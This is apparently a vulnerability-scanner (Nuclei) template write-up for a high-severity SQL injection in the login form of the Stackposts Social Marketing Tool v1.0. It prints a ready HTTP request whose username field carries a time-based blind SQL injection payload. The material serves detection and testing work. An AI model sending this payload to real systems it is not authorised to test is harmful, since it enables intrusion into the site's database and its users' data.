# Nuclei Template: Stackposts Social Marketing Tool v1.0 - SQL Injection
**Template ID:** stackposts-sqli
**Vulnerability Class:** SQL Injection
**Severity:** High
**CWE:** CWE-89
**Source:** Nuclei Template (`stackposts-sqli.yaml`)

## Vulnerability Information & PoC

## Description
SQL Injection is a type of SQL injection attack in which an attacker can exploit a vulnerability in a web application's input fields to manipulate the application's SQL queries.

## Steps to reproduce / Exploit Payload
```http
@timeout: 15s
POST /spre/auth/login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

username=1')AND (SELECT 9595 FROM (SELECT(SLEEP(7)))YRMM) AND ('gaNg'='gaNg&password=test
```

## References
- https://www.exploit-db.com/exploits/51473
- https://vulners.com/zdt/1337DAY-ID-38725
- https://codecanyon.net/item/stackposts-social-marketing-tool/21747459
